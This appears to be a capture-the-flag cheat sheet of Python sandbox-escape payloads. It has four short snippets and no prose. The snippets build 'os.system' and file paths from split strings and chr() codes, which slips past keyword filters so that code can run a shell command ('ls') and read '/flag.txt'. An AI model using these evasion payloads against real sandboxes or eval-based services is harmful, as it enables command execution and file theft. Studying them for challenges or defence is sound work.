```bash
o = "o" + "s"
s = "s" + "ystem"
com = "l" +"s"
getattr(__import__(o), s)(com)

```

```bash
com = "l" + "s"
__builtins__.__import__('o' + 's').system(com)

```


```
chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)
```

```
getattr(__builtins__, 'open')(chr(47)+ chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)).read()
```
